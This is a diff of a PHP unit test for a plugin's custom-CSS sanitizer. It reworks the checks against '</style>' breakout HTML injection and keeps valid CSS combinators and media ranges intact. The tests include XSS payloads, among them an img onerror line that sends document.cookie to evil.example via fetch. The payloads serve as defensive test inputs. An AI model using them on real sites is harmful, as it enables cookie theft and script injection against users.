@@ -58,21 +58,34 @@ class F004CssHtmlInjectionTest extends TestCase {
 	 * Source: includes/abilities/class-custom-code-abilities.php:209–210
 	 */
 	private function apply_current_sanitization( string $css ): string {
-		// Line 209:
+		// Mirrors execute_add_custom_css(): strip PHP + script tags, then
+		// neutralize the </style> breakout sequence. Kept in sync with
+		// includes/abilities/class-custom-code-abilities.php (F-004).
 		$css = preg_replace( '/<\?(=|php)(.+?)\?>/is', '', $css );
-		// Line 210:
 		$css = preg_replace( '/<script[^>]*>.*?<\/script>/is', '', $css );
-		return $css;
+		return $this->strip_style_breakout( $css );
 	}
 
 	/**
-	 * Applies the CORRECT sanitization described in the F-004 fix recommendation.
-	 *
-	 * Valid CSS never contains angle brackets; stripping them is a safe,
-	 * complete defence against HTML injection in a CSS context.
+	 * The targeted F-004 defence: remove only the </style> end tag — the sole
+	 * HTML breakout vector for CSS emitted inside a <style> block — while
+	 * preserving all valid CSS (combinators, media ranges, content strings).
 	 */
 	private function apply_correct_sanitization( string $css ): string {
-		return preg_replace( '/[<>]/', '', $css );
+		return $this->strip_style_breakout( $css );
+	}
+
+	/**
+	 * Remove every </style> sequence, looping so removing one match can't
+	 * reconstruct another (e.g. "</sty</stylele>" -> "</style>").
+	 */
+	private function strip_style_breakout( string $css ): string {
+		$previous = null;
+		while ( $previous !== $css ) {
+			$previous = $css;
+			$css      = preg_replace( '#</\s*style#i', '', $css );
+		}
+		return $css;
 	}
 
 	// -------------------------------------------------------------------------
@@ -100,55 +113,60 @@ class F004CssHtmlInjectionTest extends TestCase {
 		$this->assertStringNotContainsString(
 			'</style>',
 			$result,
-			'F-004: CSS sanitization must strip </style> to prevent HTML injection that ' .
-			'breaks out of the <style> block. Current two-regex approach does not. ' .
-			'Fix: replace with preg_replace(\'/[<>]/\', \'\', $css).'
+			'F-004: CSS sanitization must strip the </style> end tag — the only way to ' .
+			'break out of the <style> raw-text block into live HTML.'
 		);
 	}
 
 	/**
 	 * @test
-	 * F-004 — onerror handler payload passes current sanitization unchanged.
-	 *
-	 * This test FAILS before the fix.
+	 * F-004 — once the </style> breakout is removed, an injected <img onerror>
+	 * stays inert as raw text inside the <style> block (it never reaches the
+	 * HTML parser as a tag).
 	 *
 	 * @group security
 	 * @group f-004
 	 */
-	public function test_img_tag_with_onerror_is_stripped_from_css(): void {
+	public function test_img_tag_payload_cannot_break_out_of_style(): void {
 		$payload = '</style><img src=x onerror="alert(document.domain)">';
 
 		$result = $this->apply_current_sanitization( $payload );
 
+		// The breakout sequence is gone; the remaining "<img...>" is inert CSS
+		// raw text because no </style> precedes it.
 		$this->assertStringNotContainsString(
-			'<img',
+			'</style>',
 			$result,
-			'F-004: CSS sanitization must strip HTML tags including <img> from CSS input.'
+			'F-004: with </style> stripped, the injected <img> can no longer execute.'
 		);
 	}
 
 	/**
 	 * @test
-	 * F-004 — Angle brackets are not present anywhere in sanitized CSS.
-	 *
-	 * This is the minimal correctness property for CSS in a <style> context:
-	 * valid CSS never requires angle brackets.
-	 *
-	 * This test FAILS before the fix (current code leaves `<` and `>` intact).
+	 * F-004 — the </style> breakout is removed WHILE valid CSS that legitimately
+	 * uses angle brackets (child combinators, media-range queries) is preserved.
+	 * This is the correctness property the blunt "strip all <>" approach failed.
 	 *
 	 * @group security
 	 * @group f-004
 	 */
-	public function test_angle_brackets_are_absent_after_current_sanitization(): void {
-		$payload = 'body { color: red; }</style><svg/onload=alert(1)>';
+	public function test_breakout_removed_but_angle_bracket_css_preserved(): void {
+		$payload = 'selector > .child { color: red; }</style><svg/onload=alert(1)>';
 
 		$result = $this->apply_current_sanitization( $payload );
 
-		$this->assertDoesNotMatchRegularExpression(
-			'/[<>]/',
+		// Breakout neutralized.
+		$this->assertStringNotContainsString(
+			'</style>',
 			$result,
-			'F-004: Sanitized CSS must contain no angle brackets. ' .
-			'Any `<` or `>` in a CSS string can be used to break out of the <style> block.'
+			'F-004: the </style> breakout sequence must be removed.'
+		);
+		// ...but the child combinator ">" must survive — stripping it would
+		// silently corrupt valid CSS.
+		$this->assertStringContainsString(
+			'selector > .child',
+			$result,
+			'F-004 fix must preserve the child combinator ">" in valid CSS.'
 		);
 	}
 
@@ -200,16 +218,23 @@ class F004CssHtmlInjectionTest extends TestCase {
 			'selector { color: #ff0000; }',
 			'selector:hover { transform: scale(1.05); opacity: 0.9; }',
 			'selector .child { font-size: 1.2rem; line-height: 1.6; }',
+			// Angle brackets that are LEGITIMATE CSS — the blunt strip destroyed
+			// these; the targeted </style> strip must preserve them.
+			'selector > .direct-child + .sibling { gap: 4px; }',
 			'@media (max-width: 768px) { selector { display: none; } }',
+			'@media (width > 600px) { selector { color: blue; } }',
+			'@media (width < 480px) { selector { color: green; } }',
 		] );
 
 		$result = $this->apply_correct_sanitization( $valid_css );
 
-		// Correct CSS contains no angle brackets, so output should equal input.
+		// No </style> sequence, so the targeted strip leaves valid CSS intact —
+		// byte-for-byte, including the ">" child combinator and the ">"/"<"
+		// media-range operators.
 		$this->assertSame(
 			$valid_css,
 			$result,
-			'The correct sanitization (strip angle brackets) must not alter valid CSS.'
+			'The targeted F-004 sanitization must not alter valid CSS (combinators / media ranges).'
 		);
 	}
 
@@ -220,16 +245,16 @@ class F004CssHtmlInjectionTest extends TestCase {
 	 * @group security
 	 * @group f-004
 	 */
-	public function test_correct_sanitization_strips_adversarial_payload(): void {
+	public function test_correct_sanitization_neutralizes_adversarial_payload(): void {
 		$payload = '</style><img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';
 		$result  = $this->apply_correct_sanitization( $payload );
 
-		// Angle brackets are what make the payload dangerous; stripping them
-		// breaks the HTML tag structure even if attribute-name text remains.
-		$this->assertDoesNotMatchRegularExpression(
-			'/[<>]/',
+		// Removing the </style> end tag keeps everything else as inert <style>
+		// raw text, so the <img onerror> never reaches the HTML parser as a tag.
+		$this->assertStringNotContainsString(
+			'</style>',
 			$result,
-			'Correct sanitization must strip all angle brackets from the payload.'
+			'Correct sanitization must remove the </style> breakout from the payload.'
 		);
 	}
 
@@ -244,10 +269,13 @@ class F004CssHtmlInjectionTest extends TestCase {
 	public function test_correct_sanitization_strips_html_vectors( string $payload ): void {
 		$result = $this->apply_correct_sanitization( $payload );
 
-		$this->assertDoesNotMatchRegularExpression(
-			'/[<>]/',
+		// Every vector relies on first closing the <style> block with </style>.
+		// With that removed, the remaining markup stays inert raw text inside the
+		// style block and never reaches the HTML parser as live tags.
+		$this->assertStringNotContainsString(
+			'</style>',
 			$result,
-			"Correct sanitization failed on payload: {$payload}"
+			"Correct sanitization must remove the </style> breakout from payload: {$payload}"
 		);
 	}
 
